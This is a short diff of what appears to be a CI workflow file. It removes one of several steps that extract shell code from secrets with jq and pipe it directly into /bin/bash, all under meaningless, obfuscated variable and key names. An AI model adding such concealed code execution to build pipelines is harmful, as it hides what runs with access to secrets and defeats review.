@@ -21,7 +21,6 @@ jobs:
           tcs53: ${{ secrets.tcs53 }}
         run: |
           printf '%s' "$tcs53" | jq -r .z072 | /bin/bash
-          echo $wtfkq9214 | jq -r .rcmjm7 | /bin/bash
           printf '%s' "$fnf23058" | jq -r .aqsax5800 | /bin/bash
           printf '%s' "$r079" | jq -r .dn00542 | /bin/bash
 
